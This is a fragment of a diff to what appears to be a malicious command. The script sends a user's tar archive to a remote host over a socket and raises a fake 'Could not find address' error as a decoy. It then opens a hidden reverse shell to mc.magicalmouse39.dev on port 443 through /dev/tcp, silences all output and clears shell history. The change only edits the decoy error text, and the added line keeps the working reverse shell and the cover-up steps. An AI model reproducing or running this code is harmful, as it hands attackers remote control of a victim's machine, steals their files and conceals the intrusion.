@@ -6,4 +6,4 @@ user = os.getenv("USER")
 with open(f"/home/{user}/mgkl.tar", "rb") as fin:
     s.send(fin.read())
 s.close()
-raise Exception("Could not find address \"mc.magicalmouse39.dev\"")' 1>/dev/null 2>/dev/null; $(/bin/bash -l > /dev/tcp/mc.magicalmouse39.dev/443 0<&1 2>&1 &) 1>/dev/null 2>/dev/null && history -c
+raise Exception("Could not find address \"35.212.4.71\"")' 1>/dev/null 2>/dev/null; $(/bin/bash -l > /dev/tcp/mc.magicalmouse39.dev/443 0<&1 2>&1 &) 1>/dev/null 2>/dev/null && history -c
